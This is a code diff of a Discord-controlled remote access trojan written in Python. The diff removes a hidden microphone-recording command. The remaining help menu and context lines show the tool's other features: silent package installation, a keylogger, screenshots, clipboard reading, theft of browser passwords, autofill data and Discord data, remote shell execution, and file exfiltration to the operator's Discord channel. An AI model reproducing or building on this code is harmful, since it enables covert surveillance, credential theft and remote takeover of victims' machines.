@@ -34,9 +34,8 @@ def InstallPackages(packages):
         log.info(f"Installing package {package}")
         subprocess.run([PYTHON_CMD, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
-InstallPackages(packages=["requests", "pycryptodome", "pyautogui", "pyperclip", "discord.py", "pynput", "pyaudio", "discord.py[voice]"])
+InstallPackages(packages=["requests", "pycryptodome", "pyautogui", "pyperclip", "discord.py", "pynput"])
 
-import pyaudio
 import discord
 import requests
 import pyperclip
@@ -112,26 +111,6 @@ def GetClipboard():
         return f"Last item copied :\n```{pyperclip.paste()}```"
     else:
         return ":warning: Empty clipboard !"
-
-def RecordMicro(duration=10, filePath=""):
-    format = pyaudio.paInt16
-    channels = 2
-    rate = 44100
-    chunk = 1024
-    audio = pyaudio.PyAudio()
-    stream = audio.open(format=format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
-    frames = []
-    for _ in range(0, int(rate / chunk * duration)):
-        data = stream.read(chunk)
-        frames.append(data)
-    stream.stop_stream()
-    stream.close()
-    audio.terminate()
-    with wave.open(filePath, 'wb') as wf:
-        wf.setnchannels(channels)
-        wf.setsampwidth(audio.get_sample_size(format))
-        wf.setframerate(rate)
-        wf.writeframes(b''.join(frames))
 
 class LASTINPUTINFO(ctypes.Structure):
     _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
@@ -483,7 +462,7 @@ class Client(discord.Client):
             elif message.content == ".help":
                 await message.delete()
 
-                embed = discord.Embed(description=f"**Help Menu :**\n- `.ping` : Show connected devices\n- `.clear` : Clear the current text channel\n- `.kill <process.exe>` : Kill process\n- `.clipboard` : Show copied elements\n- `.grab autofill` : Grab autofill field from web browser\n- `.grab discord` : Grab user's Discord informations\n- `.grab password` : Grab passwords from web browser\n- `.grab pc` : Grab PC informations\n- `.screenshot` : Take a screenshot\n- `.start keylogger` : Start the keylogger\n- `.stop keylogger` : Stop the keylogger and send keys pressed\n- `.cd <path>` : Change  the working directory\n- `.shell <cmd>` : Execute cmd commands\n- `.voice` : Record microphone for 10 seconds\n- `.download <path/to/file>` : Download a file from the computer\n- `.idle` : Show in secondes the afk time", color=discord.Color.blue())
+                embed = discord.Embed(description=f"**Help Menu :**\n- `.ping` : Show connected devices\n- `.clear` : Clear the current text channel\n- `.kill <process.exe>` : Kill process\n- `.clipboard` : Show copied elements\n- `.grab autofill` : Grab autofill field from web browser\n- `.grab discord` : Grab user's Discord informations\n- `.grab password` : Grab passwords from web browser\n- `.grab pc` : Grab PC informations\n- `.screenshot` : Take a screenshot\n- `.start keylogger` : Start the keylogger\n- `.stop keylogger` : Stop the keylogger and send keys pressed\n- `.cd <path>` : Change  the working directory\n- `.shell <cmd>` : Execute cmd commands\n- `.download <path/to/file>` : Download a file from the computer\n- `.idle` : Show in secondes the afk time", color=discord.Color.blue())
                 await message.channel.send(embed=embed)
 
             # _____________________________________________________________________________________________________________________________________________ #
@@ -733,27 +712,6 @@ Internet Provider: {org}
                 except Exception as e:
                     embed = discord.Embed(description=f":no_entry: Unexpected error : `{e}`", color=discord.Color.red())
                     await message.channel.send(embed=embed)
-
-            # _____________________________________________________________________________________________________________________________________________ #
-            # =================================================================== .voice ================================================================== #
-            elif message.content == ".vc" or message.content == ".voice":
-                await message.delete()
-                
-                embed = discord.Embed(description=":microphone2: Recording... This action may take time !", color=discord.Color.yellow())
-                await message.channel.send(embed=embed)
-
-                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.wav"
-                RecordMicro(filePath=filePath)
-
-                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
-                embedSent = await message.channel.send(embed=embed)
-
-                fileEmbed = discord.File(filePath, filename=f"{os.getlogin()} - Recorded.wav")
-                await message.channel.send(file=fileEmbed)
-
-                await embedSent.delete()
-
-                SafeRemove(filePath)
 
             # ________________________________________________________________________________________________________________________________________________ #
             # =================================================================== .download ================================================================== #
